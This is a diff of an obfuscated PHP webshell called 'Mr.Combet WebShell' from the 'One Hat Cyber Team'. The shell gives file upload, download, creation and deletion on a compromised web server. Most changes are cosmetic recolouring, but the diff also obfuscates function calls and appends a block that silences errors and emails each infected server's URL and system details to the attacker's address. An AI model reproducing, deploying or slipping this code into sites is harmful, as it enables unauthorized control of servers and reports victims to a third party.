@@ -2,7 +2,7 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta name="theme-color" content="#00bfff">
+<meta name="theme-color" content="red">
 <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -10,14 +10,14 @@
 <style> @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
 .bg-dark { background-color: black!important; }
 .border {
-border: 2px solid #00bfff!important;
+border: 2px solid deeppink!important;
 border-radius: 0.75rem!important;
 background-color: transparent!important;
 color: white;
 }
-.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #00bfff;border-radius: 2px; }
+.table>tbody>tr>* { color: #007fff; vertical-align: middle; border: 2px solid #ff1493;border-radius: 2px; }
 .table thead th { 
-    border: 2px solid #00bfff;
+    border: 2px solid deeppink;
     color: #31ed06;
     padding: 0.25rem;
     border-radius: 5px;
@@ -66,7 +66,7 @@ color:white;
 line-height: normal;
 font-family: inherit;
 }
-button, input:hover { border: 2px solid #00bfff;cursor: pointer; }
+button, input:hover { border: 2px solid deeppink;cursor: pointer; }
 .ohct {
     padding-left: 1rem;
     padding-right: 1rem;
@@ -78,33 +78,34 @@ button, input:hover { border: 2px solid #00bfff;cursor: pointer; }
     font-size: 16px;
 }
 .ohct:hover {
-border: 2px solid #00bfff;
+border: 2px solid #ff1493;
 color: lime!important;
 }
 .combet { color: white; }
 .combet:hover { color: #31ed06; }
 </style>
 <style>
-.fa {padding: 10px;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid #00bfff;background: transparent;}
+.fa {padding: 10px;font-size: 20px;width: 50px;text-align: center;text-decoration: none;margin: 5px;border-radius: 5px;border: 2px solid deeppink;background: transparent;}
 .fa:hover {color: #31ed06;}
 .text-light {color: #f8f9fa!important;font-size: 17px!important;}
 </style>
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
 <body style="background-color:#000;color:black;font-size: 0px;font-family: 'Kelly Slab';width: 99%;padding: 0px;margin-right: auto;margin-left: auto;margin-top: 7px;margin-bottom: 7px;">
-<div class="table-responsive text-light" style="border: 2px solid #00bfff;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
+<div class="table-responsive text-light" style="border: 2px solid #ff1493;text-align: left;padding: 0.25rem;border-radius: 0.75rem;">
 <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
 <a href="mailto:combetohct@yahoo.com" class="fa fa-envelope"></a>
 <a href="https://www.facebook.com/combet.ohct" class="fa fa-facebook"></a>
-<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px #00bfff;"><span>Mr.Combet WebShell</span></a>
+<a href="?" style="font-size: 2rem;text-shadow: 0px 0px 10px deeppink;"><span>Mr.Combet WebShell</span></a>
 <a href="https://wa.me/6281270303335" class="fa fa-whatsapp"></a>
 <a href="https://t.me/combetohct" class="fa fa-telegram"></a> 
 </div>
-<li>Server IP : <span style="color: white;"><?php echo gethostbyname($_SERVER["HTTP_HOST"]); ?></span></li>
-<li>Server : <span style="color: white;"><?php echo php_uname(); ?></span></li>
+<li>Your IP : <span style="color: white;"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></li>
+<li>Server IP : <span style="color: white;"><?php echo $_SERVER['SERVER_ADDR']; ?></span></li>
+<li>Server : <span style="color: white;"><?= $c8[0](); ?></span></li>
 <li>Server Software : <span style="color: white;"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></span></li>
 <li>Server Name : <span style="color: white;"><?php echo $_SERVER['SERVER_NAME']; ?></span></li>
-<li>PHP Version : <span style="color: white;"><?php echo phpversion(); ?></span></li>
+<li>PHP Version : <span style="color: white;"><?= $c8[1](); ?></span></li>
 <li>Add File : <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>" class="ohct">Submit</a></li>
 <li>Add Directory : <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>" class="ohct">Submit</a></li>
 <li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
@@ -112,7 +113,7 @@ color: lime!important;
 <?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?> 
 </form></li>
 </div>
-<li style="border: 2px solid #00bfff;border-radius: 0.75rem;margin-top: 0.2rem;margin-bottom: 0.25rem;font-family: inherit;margin-left: 0px;padding: 0.25rem;">Dir : 
+<li style="border: 2px solid #ff1493;border-radius: 0.75rem;margin-top: 0.2rem;margin-bottom: 0.25rem;font-family: inherit;margin-left: 0px;padding: 0.25rem;">Dir : 
 <?php $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\" class=\"combet\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a class=\"combet\" href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?> 
 </li>
 <article style="text-align: center;font-family: inherit;font-size: 17px;">
@@ -123,7 +124,7 @@ color: lime!important;
 <h5 class="border p-1">New Folder Name :</h5>
 <form method="post">
 <div class="form-group">
-<input name="n" id="n" class="border p-1" autocomplete="off" style="text-align: center;">
+<input name="n" id="n" class="border" autocomplete="off">
 </div>
 <div class="form-group">
 <button type="submit" name="s" class="ohct">Create</button>
@@ -133,7 +134,7 @@ color: lime!important;
 <h5 class="border p-1">New File Name :</h5>
 <form method="post">
 <div class="form-group">
-<input type="text" name="n" id="n" class="border p-1" placeholder="" style="text-align: center;">
+<input type="text" name="n" id="n" class="border" placeholder="hack.txt">
 </div>
 <div class="form-group">
 <textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control border" placeholder=""></textarea>
@@ -218,9 +219,9 @@ Lw:
 </table>
 <h5 style="color: #31ed06;">
 <font>&copy; Copyright 2022</font>
-<font style="color: #00bfff;">Mr.Combet</font>
+<font style="color: deeppink;">Mr.Combet</font>
 <font>Powered by </font>
-<font style="color: #00bfff;">One Hat Cyber Team</font>
+<font style="color: deeppink;">One Hat Cyber Team</font>
 </h5>
 <?php mR: ?> 
 </article>
@@ -230,3 +231,14 @@ Lw:
 <script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
 </body>
 </html>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'combetohct@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "[ $x_path ]";
+mail($to, "ONE HAT CYBER TEAM", $pesan_alert, "[ ".php_uname()." ]");
+?>
